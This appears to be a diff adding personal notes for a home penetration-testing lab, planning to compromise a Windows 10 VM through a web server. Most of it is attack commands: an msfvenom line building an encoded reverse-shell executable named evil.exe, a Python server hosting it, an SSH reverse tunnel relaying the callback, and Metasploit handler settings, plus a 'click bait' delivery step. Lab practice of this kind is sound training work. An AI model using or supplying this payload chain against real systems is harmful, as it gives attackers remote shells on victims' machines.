@@ -1,0 +1,45 @@
+Kali-lab test
+
+Goal:  
+- Gain access from <Kali> to <TARGET>/(Win-10) through a web-server.
+How:
+- From <TARGET>; view Ubuntu "compromised-web-srvr"; download "evil.exe" and have traffic appear as normal web traffic.
+	--See first diagram below.*
+
+Idea #1:
+--------
+1) From: kali [msfconsole]--
+	#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=5959 > evil.exe
+2) From: UbUntu [/home/ubuntu/Public] -- Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
+	#> python3 -m http.server 8080
+3) Setup SSH Reverse Tunnel from Kali <--> UbUntu to receive the callback
+   From: kali
+   	#> ssh ubuntu@10.0.0.30 -R 5959:0.0.0.0:2960
+	
+* I think this will forward all traffic going to 10.0.0.30:5959 --> to my Kali (10.0.0.20:2960)  *
+	
+Idea #2 use netcat listeners instead of ssh tunnel 
+
+4) Await connection via Kali-msfconsole-multi/stage/handler
+   From: kali [msfconsole]--
+   	#> use exploit/multi/handler
+	#> set payload windows/shell/reverse_tcp
+	#> set LHOST 10.0.0.20
+	#> set LPORT 2960
+	
+5) Click bait and "/exploit" and cross fingers...?
+ 	
+    Kali-VM			                UbUntu-VM			                  Windows10-VM
+  My attack VM 			        compromised Web-Srvr		              <TARGET>
+ _______________		          _______________		               _______________
+|		            |		         | <click-bait>	 |		            |		            | 
+|	              |		         |               |                |               |
+|		            |		         |		           |		            |		            |  
+|   		        |            |               |                |               |
+|_______________|		         |_______________|		            |_______________|
+   10.0.0.20			                10.0.0.30			                  10.0.0.40
+- kali 				- ubuntu			-                                           
+
+
+===============================================================================================================================
+===============================================================================================================================
